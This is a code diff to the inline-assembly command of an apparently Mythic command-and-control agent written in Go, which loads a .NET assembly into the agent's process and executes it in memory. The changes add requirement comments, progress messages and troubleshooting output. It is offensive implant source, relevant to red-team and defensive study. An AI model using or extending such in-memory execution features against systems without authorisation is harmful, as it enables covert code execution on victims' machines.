@@ -20,6 +20,12 @@
 //  - Assemblies execute in the agent's process context
 //  - All users with access to Mythic can access uploaded assemblies
 //
+// Assembly requirements:
+//  - Must be a valid .NET Framework assembly (not .NET Core/.NET 5+)
+//  - Must have a standard Main() entry point signature
+//  - Should be compiled for AnyCPU or the target architecture
+//  - External dependencies must be in the GAC or loaded separately
+//
 package commands
 
 import (
@@ -120,11 +126,13 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 
 	// Collect all chunks into a byte slice
 	var assemblyBytes []byte
+	totalBytesReceived := 0
 	for chunk := range getFileMsg.ReceivedChunkChannel {
 		if chunk == nil || len(chunk) == 0 {
 			break
 		}
 		assemblyBytes = append(assemblyBytes, chunk...)
+		totalBytesReceived += len(chunk)
 	}
 
 	if len(assemblyBytes) == 0 {
@@ -133,6 +141,14 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 			Status:    "error",
 			Completed: true,
 		}
+	}
+
+	// Send status update
+	task.Job.SendResponses <- structs.Response{
+		TaskID:     task.ID,
+		UserOutput: fmt.Sprintf("[*] Received assembly: %d bytes", totalBytesReceived),
+		Status:     "processing",
+		Completed:  false,
 	}
 
 	// Parse arguments string into array
@@ -154,6 +170,14 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		}
 	}
 
+	// Send execution status
+	task.Job.SendResponses <- structs.Response{
+		TaskID:     task.ID,
+		UserOutput: fmt.Sprintf("[*] Executing assembly with %d argument(s)...", len(args)),
+		Status:     "processing",
+		Completed:  false,
+	}
+
 	// Execute the assembly - wrapped in a recovery to catch panics
 	var stdout, stderr string
 	func() {
@@ -163,8 +187,19 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 			}
 		}()
 		
+		// Use ExecuteByteArrayDefaultDomain which properly handles the AppDomain
 		stdout, stderr = clr.ExecuteByteArrayDefaultDomain(runtimeHost, assemblyBytes, args)
 	}()
+
+	// Check if we got an error that suggests the assembly couldn't be executed
+	if stderr != "" && strings.Contains(stderr, "cannot find the file") {
+		stderr += "\n\nTroubleshooting tips:\n"
+		stderr += "  - Ensure the assembly is a valid .NET executable (.exe)\n"
+		stderr += "  - Ensure the assembly targets .NET Framework (not .NET Core/.NET 5+)\n"
+		stderr += "  - Check that the assembly has a proper Main() entry point\n"
+		stderr += "  - Verify the assembly isn't corrupted during transfer\n"
+		stderr += fmt.Sprintf("  - Assembly size received: %d bytes\n", len(assemblyBytes))
+	}
 
 	// Build output
 	var output strings.Builder
